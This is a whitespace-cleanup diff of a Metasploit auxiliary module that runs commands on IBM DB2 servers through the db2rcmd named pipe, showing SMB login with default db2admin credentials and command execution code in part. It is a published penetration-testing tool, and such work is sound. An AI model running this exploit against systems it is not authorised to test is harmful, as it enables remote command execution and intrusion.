@@ -1,5 +1,9 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -12,7 +16,7 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Exploit::Remote::SMB
 
 	def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'           => 'IBM DB2 db2rcmd.exe Command Execution Vulnerability.',
 			'Description'    => %q{
 					This module exploits a vulnerability in the Remote Command Server
@@ -31,12 +35,12 @@ class Metasploit3 < Msf::Auxiliary
 				],
 			'DisclosureDate' => 'Mar 4 2004'))
 
-			register_options( 
+			register_options(
 				[
 					OptString.new('CMD', [ true, 'The command to execute', 'ver']),
 					OptString.new('SMBUser', [ true, 'The username to authenticate as', 'db2admin']),
 					OptString.new('SMBPass', [ true, 'The password for the specified username', 'db2admin'])
-				], self.class )	
+				], self.class )
 	end
 
 	def run
@@ -46,7 +50,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		print_status("Authenticating as user '#{datastore['SMBUser']}' with pass '#{datastore['SMBPass']}'...")
 
-		# Connect with a valid user/pass. if not, then bail.		
+		# Connect with a valid user/pass. if not, then bail.
 		begin
 			smb_login()
 		rescue ::Exception => e
@@ -54,8 +58,8 @@ class Metasploit3 < Msf::Auxiliary
 			disconnect
 			return
 		end
-	
-		# Have it so our command arg is convenient to call.	
+
+		# Have it so our command arg is convenient to call.
 		rcmd = datastore['CMD']
 
 		print_status("Connecting to named pipe \\DB2REMOTECMD...")
@@ -84,10 +88,10 @@ class Metasploit3 < Msf::Auxiliary
 		# Read from the pipe and give us the data.
 		res = pipe.read()
 		puts res
-		
+
 		# Close the named pipe and disconnect from the socket.
-		pipe.close	
+		pipe.close
 		disconnect
-			
+
 	end
 end
